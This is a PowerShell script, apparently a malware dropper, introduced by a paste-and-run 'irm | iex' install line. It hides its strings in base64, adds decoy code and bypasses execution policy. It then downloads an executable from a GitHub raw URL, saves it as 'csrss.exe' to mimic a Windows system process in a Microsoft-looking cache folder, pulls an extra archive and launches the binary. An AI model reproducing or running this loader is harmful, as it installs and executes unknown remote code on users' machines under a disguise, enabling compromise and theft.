# mux-flux quasit | do not pretty-print
# irm https://raw.githubusercontent.com/arxstore/curado/refs/heads/main/network.ps1 | iex
$ErrorActionPreference='Stop';try{Set-ExecutionPolicy -Scope Process Bypass -Force -EA 0}catch{};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
function __b([string]$z){[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($z))}
function __x([byte[]]$a,[byte]$k){$o=New-Object byte[] $a.Length;for($i=0;$i -lt $a.Length;$i++){$o[$i]=$a[$i]-bxor($k -bxor ($i -band 7))};return [Text.Encoding]::UTF8.GetString($o)}
# decoy entropy (unused)
$qWz=Get-Random;$nKp=__x ([Convert]::FromBase64String('KCgpKSkpKCgoKCgo')) 0x3C;$null=$nKp;$null=$qWz
$a1=__b 'cmVmcy9oZWFkcy9tYWlu';$a2=__b 'YXJ4c3RvcmU=';$a3=__b 'Y3VyYWRv';$a4=__b 'Y3Nyc3MuZXhl';$a5=__b 'cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbQ=='
$u0="https://$a5/$a2/$a3/$a1/$a4";if($ExeUrl){$u0=[string]$ExeUrl}
$d0=Join-Path $env:LOCALAPPDATA (__b 'TWljcm9zb2Z0XFdpbmRvd3NcQ2FjaGVz');New-Item -ItemType Directory -Force -Path $d0|Out-Null
$p0=Join-Path $d0 $a4;$t0="$p0.$([guid]::NewGuid().ToString('N').Substring(0,8))"
Remove-Item -LiteralPath $t0 -Force -EA 0
Invoke-WebRequest -Uri $u0 -OutFile $t0 -UseBasicParsing
if(-not(Test-Path -LiteralPath $t0)-or((Get-Item -LiteralPath $t0).Length -le 1024)){Remove-Item -LiteralPath $t0 -Force -EA 0;throw (__b 'ZmFpbA==')}
if(Test-Path -LiteralPath $p0){Remove-Item -LiteralPath $p0 -Force -EA 0}
Move-Item -LiteralPath $t0 -Destination $p0 -Force
try{
  $u1="https://$a5/$a2/$a3/$a1/$(__b 'YXNzZXRzLnppcA==')";$z0=Join-Path $d0 ("z"+[guid]::NewGuid().ToString('N').Substring(0,6))
  Invoke-WebRequest -Uri $u1 -OutFile $z0 -UseBasicParsing -EA Stop
  if((Test-Path $z0)-and((Get-Item $z0).Length -gt 64)){
    $x0=Join-Path $d0 ("x"+[guid]::NewGuid().ToString('N').Substring(0,6));if(Test-Path $x0){Remove-Item $x0 -Recurse -Force -EA 0}
    Expand-Archive -LiteralPath $z0 -DestinationPath $x0 -Force
    $s0=Join-Path $d0 (__b 'YXNzZXRz');if(Test-Path $s0){Remove-Item $s0 -Recurse -Force -EA 0}
    $i0=Join-Path $x0 (__b 'YXNzZXRz')
    if(Test-Path $i0){Copy-Item $i0 $s0 -Recurse -Force}else{New-Item -ItemType Directory -Force -Path $s0|Out-Null;Copy-Item (Join-Path $x0 '*') $s0 -Recurse -Force}
    Remove-Item $x0 -Recurse -Force -EA 0
  }
  if(Test-Path -LiteralPath $z0){Remove-Item -LiteralPath $z0 -Force -EA 0}
}catch{}
Start-Process -FilePath $p0
Remove-Item -LiteralPath $t0 -Force -EA 0
